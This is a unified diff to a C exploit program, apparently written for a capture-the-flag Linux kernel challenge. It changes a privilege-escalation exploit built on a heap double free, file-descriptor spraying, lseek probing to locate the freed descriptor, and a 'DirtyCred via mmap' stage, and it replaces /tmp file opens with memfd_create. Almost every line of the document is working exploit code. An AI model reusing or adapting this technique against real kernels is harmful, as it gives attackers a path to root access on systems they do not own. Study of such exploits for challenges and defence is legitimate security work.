@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include "libs/pwn.h"
 #include "libs/readflag.h"
 #include <stdint.h>
@@ -30,11 +31,6 @@ int main(void) {
 
   lstage("START");
 
-  // create target file
-  tmp_a = SYSCHK(
-      open("/tmp/chovid99", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));
-  SYSCHK(close(tmp_a));
-
   linfo("create and free heap allocation for double free later");
   void *keap_ptrs[SPRAY_VULN] = {0};
   for (int i = 0; i < SPRAY_VULN; i++) {
@@ -58,7 +54,7 @@ int main(void) {
   linfo("Spray FDs");
   int spray_fds[NUM_SPRAY_FDS_1];
   for (int i = 0; i < NUM_SPRAY_FDS_1; i++) {
-    spray_fds[i] = SYSCHK(open("/tmp/chovid99", O_RDWR)); // /tmp/a is a writable file
+    spray_fds[i] = SYSCHK(memfd_create("a", 0)); // /tmp/a is a writable file
     if (spray_fds[i] == -1) {
       puts("Failed to open FDs");
       return EXIT_FAILURE;
@@ -78,7 +74,7 @@ int main(void) {
   linfo("Find the freed FD using lseek");
   int spray_fds_2[NUM_SPRAY_FDS_2];
   for (int i = 0; i < NUM_SPRAY_FDS_2; i++) {
-    spray_fds_2[i] = SYSCHK(open("/tmp/chovid99", O_RDWR));
+    spray_fds_2[i] = SYSCHK(memfd_create("a", 0));
     SYSCHK(lseek(spray_fds_2[i], 0x8, SEEK_SET));
   }
   // After: 2 fd 1 refcount (Because new file)
@@ -107,7 +103,6 @@ int main(void) {
   lstage("DirtyCred via mmap");
   char *file_mmap = mmap(NULL, NOP_SLIDE_SIZE + sizeof(readflag),
                          PROT_READ | PROT_WRITE, MAP_SHARED, freed_fd, 0);
-  CHK(file_mmap != MAP_FAILED);
   // After: 3 fd 2 refcount (Because new file)
 
   SYSCHK(close(freed_fd));
